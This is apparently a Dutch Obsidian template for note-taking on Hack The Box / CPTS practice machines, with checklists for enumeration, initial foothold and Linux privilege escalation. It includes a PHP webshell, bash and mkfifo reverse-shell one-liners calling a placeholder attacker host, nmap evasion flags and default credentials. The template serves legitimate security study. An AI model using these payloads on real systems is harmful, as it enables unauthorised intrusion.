---
title: "{{title}}"
created: {{date}}
updated: {{date}}
tags: [cert, cpts, box]
category: 10-projects
status: active
machine: {{title}}
os: 
platform: 
difficulty: 
ip: 
url: 
---

<!-- Sync: als checklists/enumeratie.md, checklists/initial-foothold.md of
     checklists/linux-privesc.md wijzigt, werk de stappen hieronder dan ook bij.
     Live als Obsidian-template op kali-cpts: .../offensive/Templates/Box-note.md
     (Settings > Templates). Wijzig bij updates beide kopieën.
     Placeholders $TARGET_IP / $ATTACKER_IP / $TARGET_PORT / $ATTACKER_PORT / $DOMAIN
     vul je per target in. De boxnaam komt uit {{title}} (= note-titel): geef de note de
     naam van de box, dan vullen alle ~/boxes/-paden, de titel en 'machine:' zich vanzelf. -->

# {{title}}

**OS:** [Linux/Windows] · **Platform:** [HTB Academy/HTB Main/CTF] · **Moeilijkheid:** [Easy/Medium/Hard] · **Status:** active/done

Zie ook: [[enumeratie]] · [[initial-foothold]] · [[linux-privesc]]

## Overzicht

- [ ] Werkmap aanmaken (alle output + evidence onder één box-map)
  ```bash
  mkdir -p ~/boxes/{{title}}/{scans,loot,exploits,evidence}
  ```

### Hosts

| IP | Hostname / FQDN | OS | Rol / notities |
|---|---|---|---|
| $TARGET_IP | | | |

> [!info]- Kolom-uitleg
> - **IP** — adres van de host. Vb: `10.129.34.16`
> - **Hostname / FQDN** — naam uit DNS/SMB/SSL-cert. Vb: `dc1.internal.inlanefreight.htb`
> - **OS** — uit TTL (128 Win / 64 Linux), `-O` of banners. Vb: `Windows Server 2019`
> - **Rol / notities** — functie of bijzonderheid. Vb: `Domain Controller`

### Poorten & services

| Poort | Proto | State | Service | Versie | Opmerking |
|---|---|---|---|---|---|
| | TCP | open | | | |

> [!info]- Kolom-uitleg
> - **Poort** — poortnummer. Vb: `445`
> - **Proto** — `TCP` of `UDP`. Vb: `TCP`
> - **State** — `open` / `filtered` / `closed`. Vb: `open`
> - **Service** — dienst op de poort. Vb: `netbios-ssn (SMB)`
> - **Versie** — product + versie uit `-sV`. Vb: `Samba smbd 4.6.2`
> - **Opmerking** — lead/aandachtspunt. Vb: `null session toegestaan`

### Web / URLs

| URL / pad | Status | Tech / CMS + versie | Interessant | Opmerking |
|---|---|---|---|---|
| | | | | |

> [!info]- Kolom-uitleg
> - **URL / pad** — gevonden pad. Vb: `/admin.php`
> - **Status** — HTTP-code. Vb: `200` (of `301`/`403`)
> - **Tech / CMS + versie** — framework/CMS. Vb: `Nibbleblog 4.0.3`
> - **Interessant** — login/upload/LFI/API. Vb: `admin-login`
> - **Opmerking** — vervolg. Vb: `default creds admin:nibbles`

### Service-bevindingen (overige services)

| Dienst (poort) | Bevinding | Lead / vervolg |
|---|---|---|
| | | |

> [!info]- Kolom-uitleg
> - **Dienst (poort)** — welke service. Vb: `DNS (53)` / `SNMP (161)` / `FTP (21)`
> - **Bevinding** — wat je ophaalde. Vb: `AXFR lukt → 5 subdomeinen`
> - **Lead / vervolg** — volgende stap. Vb: `internal.* toevoegen aan /etc/hosts`

## Credentials & secrets

> Centrale plek voor élke gevonden credential — kern van de credential-reuse-chain
> (cred uit dienst A werkt vaak bij dienst B).

| Bron | Username | Secret | Geldig op | Opmerking |
|---|---|---|---|---|
| | | | | |

> [!info]- Kolom-uitleg
> - **Bron** — waar gevonden. Vb: `NFS ticket .txt` / `SNMP` / `gsconfig.php`
> - **Username** — Vb: `alex`
> - **Secret** — wachtwoord/hash/key(-pad). Vb: `lol123!mD`
> - **Geldig op** — dienst(en) waar hij werkt. Vb: `SMB, RDP`
> - **Opmerking** — Vb: `password-reuse → Administrator`

## 1. Enumeratie

- [ ] Nmap quick + scriptscan
  ```bash
  nmap -sC -sV -p- $TARGET_IP -oA ~/boxes/{{title}}/scans/nmap_full
  ```
  > [!tip]- Andere handige nmap-commando's
  > - `nmap -p- --min-rate 5000 $TARGET_IP` — snelle full-port sweep, dáárna gericht `-sCV`
  > - `nmap -sU --top-ports 100 $TARGET_IP -oA ~/boxes/{{title}}/scans/nmap_udp` — UDP (SNMP/IPMI/DNS)
  > - `nmap -p <poorten> -sV --script vuln $TARGET_IP -oA ~/boxes/{{title}}/scans/nmap_vuln` — bekende CVE's
  > - `nmap -sn $TARGET_IP/24 -oA ~/boxes/{{title}}/scans/hosts` — host discovery op een range

  > [!warning]- Waar op letten
  > - "host down"? ICMP geblokkeerd → `-Pn`
  > - TTL in de reply verraadt het OS (128 Win / 64 Linux / 255 netwerkapparatuur)
  > - UDP-scans zijn traag → `--top-ports`; IDS/IPS → stiller (`-T2`) of evasion (`-D RND:5`, `--source-port 53`/`-g53`, `-S <ip> -e tun0`)
  > - `host:poort`-notatie bestaat niet in nmap; `-p` los van het IP

- [ ] Banner grabbing op interessante poorten
  ```bash
  nc -nv $TARGET_IP $TARGET_PORT
  ```
  > [!tip]- Varianten
  > - TLS-poort: `openssl s_client -connect $TARGET_IP:$TARGET_PORT`
  > - `telnet $TARGET_IP $TARGET_PORT` als `nc` geen banner geeft

- [ ] FTP (21): anonieme login proberen (`anonymous:anonymous`)
  > [!tip]- Varianten
  > - Alles trekken: `wget -m --no-passive ftp://anonymous:anonymous@$TARGET_IP -P ~/boxes/{{title}}/loot/`
  > - TLS-FTP: `openssl s_client -connect $TARGET_IP:21 -starttls ftp` (cert lekt hostname/email)

  > [!warning]- Waar op letten
  > - Check upload-rechten (`put`) → naast een webserver mogelijk RCE
  > - `ls -la` en `ls -R` voor verborgen/recursieve content

- [ ] SMB (139/445): shares listen, dan met/zonder credentials
  ```bash
  smbclient -N -L \\$TARGET_IP
  rpcclient -U "" $TARGET_IP
  ```
  > [!tip]- Andere SMB-tools
  > - `smbmap -H $TARGET_IP` — share-permissies in één oogopslag
  > - `crackmapexec smb $TARGET_IP --shares -u '' -p ''`
  > - `enum4linux-ng.py $TARGET_IP -A -oA ~/boxes/{{title}}/scans/enum4linux`
  > - rpcclient: `enumdomusers`, `netshareenumall`, `netsharegetinfo <share>`, RID-brute

  > [!warning]- Waar op letten
  > - Null session lekt vaak users/shares → daarna creds raden/reusen
  > - `netsharegetinfo`/`netshareenumall` geven custom share-versie + systeempad

- [ ] SNMP (udp 161): community strings, dan brute + OID-brute
  ```bash
  snmpwalk -v2c -c public $TARGET_IP | tee ~/boxes/{{title}}/scans/snmpwalk.txt
  ```
  > [!tip]- Varianten
  > - `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET_IP` — community-brute
  > - `braa <community>@$TARGET_IP:.1.3.6.*` — OID-brute

  > [!warning]- Waar op letten
  > - `grep` op `@` (emails), versie en `HTB` in de output
  > - v1/v2c sturen de community in plaintext; lekt OS/packages/scripts (met creds)

- [ ] Overige services (indien poort open) — commando's + gotcha's: zie [[enumeratie]]
  - [ ] DNS (53): `dig any/axfr $DOMAIN @$TARGET_IP`; `dnsenum --dnsserver $TARGET_IP ... -o ~/boxes/{{title}}/scans/dnsenum.txt`
  - [ ] NFS (2049): `showmount -e $TARGET_IP` → `mount -t nfs $TARGET_IP:/<share> ~/boxes/{{title}}/loot/nfs -o nolock`
  - [ ] SMTP (25): `telnet $TARGET_IP 25` (VRFY), `smtp-user-enum -M VRFY -U users.txt -t $TARGET_IP`
  - [ ] IMAP/POP3 (143/993/110/995): `openssl s_client -connect $TARGET_IP:imaps` (SSL-cert org/FQDN) + login
  - [ ] DB: MySQL (3306, `--skip-ssl`), MSSQL (1433, `impacket-mssqlclient`), Oracle (1521, `odat`)
  - [ ] IPMI (udp 623): `ipmi_dumphashes` → `hashcat -m 7300`; default creds
  - [ ] Remote mgmt: SSH (22), Rsync (873), RDP (3389), WinRM (5985/6), WMI (135)

- [ ] Web: whatweb + curl (HTML-comments checken)
  ```bash
  whatweb http://$TARGET_IP | tee ~/boxes/{{title}}/scans/whatweb.txt
  curl -s http://$TARGET_IP
  ```
  > [!warning]- Waar op letten
  > - Broncode handmatig op comments checken (Ctrl+U); `robots.txt`, `sitemap.xml`

- [ ] Web: directory-enumeratie
  ```bash
  gobuster dir -u http://$TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ~/boxes/{{title}}/scans/gobuster.txt
  ```
  > [!tip]- Varianten
  > - `ffuf -u http://$TARGET_IP/FUZZ -w <list> -o ~/boxes/{{title}}/scans/ffuf.json`
  > - Extensies: `-x php,txt,html`; grotere lijst: `directory-list-2.3-medium.txt`
  > - vhost/subdomain fuzzing bij virtual hosting

  > [!warning]- Waar op letten
  > - Directory listing aan → handmatig doorbladeren (lekt soms backups direct)
  > - Let op status 403 vs 200 vs 301

- [ ] Web: versie-info uit README/config/XML-bestanden
- [ ] Web: wpscan aggressive plugin-enum (indien WordPress)
  ```bash
  wpscan --url http://$TARGET_IP/ --enumerate ap --plugins-detection aggressive -o ~/boxes/{{title}}/scans/wpscan.txt
  ```
  > [!warning]- Waar op letten
  > - Passieve detectie mist niet-zichtbare plugins → `aggressive` is nodig
  > - `--api-token` voor CVE-data uit de WPScan-database

- [ ] Admin-panel met default/geraden credentials proberen

### Walkthrough

```bash

```

### Bevindingen

- 

## 2. Initial foothold

- [ ] Gevonden credentials eerst hergebruiken (cred uit dienst A → login bij dienst B;
      ssh/smbclient/xfreerdp/evil-winrm/mysql) + default/geraden creds (`admin:admin`,
      boxnaam, iDRAC `root:calvin`, Supermicro IPMI `ADMIN:ADMIN`)
- [ ] searchsploit
  ```bash
  searchsploit <naam> <versie>
  ```
  > [!tip]- Varianten
  > - `searchsploit -m <id>` — kopieer exploit naar cwd (dan → `~/boxes/{{title}}/exploits/`)
  > - `searchsploit -x <id>` — bekijk de exploit

  > [!warning]- Waar op letten
  > - Lees de exploit vóór uitvoeren; pas IP/poort/paden aan
  > - Versie moet exact matchen; check ook minor-versies

- [ ] Metasploit search + module configureren
- [ ] Testpayload om code execution te bevestigen, pas daarna reverse shell
  > [!tip]- Snelle webshell-test
  > - `<?php system($_GET['cmd']); ?>` → `curl 'http://$TARGET_IP/shell.php?cmd=id'`

- [ ] Listener klaarzetten
  ```bash
  nc -lvnp $ATTACKER_PORT
  ```
  > [!tip]- Betere listeners
  > - `rlwrap nc -lvnp $ATTACKER_PORT` — pijltjes/history in de shell
  > - pwncat-cs of metasploit `multi/handler` voor stabielere sessies

- [ ] Reverse shell triggeren
  > [!tip]- Oneliners (bron: revshells.com)
  > - bash: `bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1`
  > - mkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP $ATTACKER_PORT >/tmp/f`

  > [!warning]- Waar op letten
  > - `bash` vs `sh`; URL-encode de payload in web-context
  > - Egress-filtering? probeer poort 80/443/53 als `$ATTACKER_PORT`

- [ ] TTY upgraden
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
  > [!tip]- Volledige upgrade
  > - `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm-256color` → `stty rows <r> cols <c>`

  > [!warning]- Waar op letten
  > - `python` ontbreekt soms → `which python3`; anders `script`/`socat`

- [ ] Bestanden overzetten indien nodig
  ```bash
  python3 -m http.server $ATTACKER_PORT   # draai vanuit ~/boxes/{{title}}/
  ```
  > [!tip]- Op de target
  > - `wget http://$ATTACKER_IP:$ATTACKER_PORT/<bestand>` of `curl -o <bestand> ...`
  > - `scp` (bij SSH), base64, of `/dev/tcp` als omweg

  > [!warning]- Waar op letten
  > - `file`/`md5sum` om de overdracht te valideren
  > - `.sh` met `^M` in de fout = CRLF → `sed -i 's/\r$//'`

### Walkthrough

```bash

```

### Bevindingen

- 

## 3. Privilege escalation

- [ ] `sudo -l` + GTFOBins
  ```bash
  sudo -l
  ```
  > [!warning]- Waar op letten
  > - `(user2 : user2) NOPASSWD: ...` = alleen díe runas-user → `sudo -u user2 <cmd>`
  > - Zoek elke toegestane binary op GTFOBins

- [ ] LinEnum/LinPEAS
  ```bash
  /opt/tools/privesc/linux/linpeas/linpeas.sh | tee /tmp/linpeas.txt
  ```
  > [!tip]- Varianten
  > - `linpeas.sh -a` (alle checks), `pspy` voor cron/processen
  > - Exfil de output naar `~/boxes/{{title}}/loot/`

  > [!warning]- Waar op letten
  > - Enum-scripts maken "noise" (IDS/AV) → eerst handmatige quick-wins
  > - Draai eerst `sudo -l`, SUID en capabilities handmatig

- [ ] Schrijfbare bestanden die als root draaien (sudoers/cron)
- [ ] SSH-keys (leesbaar `/root/.ssh/id_rsa`?)
  > [!warning]- Waar op letten
  > - Kopieer de key eerst naar eigen bezit, dán `chmod 600` (chmod op andermans bestand faalt)

- [ ] SUID-binaries
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
  > [!tip]- Ook checken
  > - Capabilities: `getcap -r / 2>/dev/null`
  > - Schrijfbare paden in `$PATH`; elke binary op GTFOBins

- [ ] Cron jobs
- [ ] Exposed credentials (config/log/.bash_history)
- [ ] Kernel-exploits

### Walkthrough

```bash

```

### Bevindingen

- 

## Vragen

**Vraag 1:** 
> [!success]- Antwoord
> 

**Vraag 2:** 
> [!success]- Antwoord
> 

## Tijdlijn

<!-- Wordt gevuld door dz -j, dz -f en dz -s. -->

## Flags

**User flag**
> [!success]- Flag
> 

**Root flag**
> [!success]- Flag
> 

## Geleerd

- 
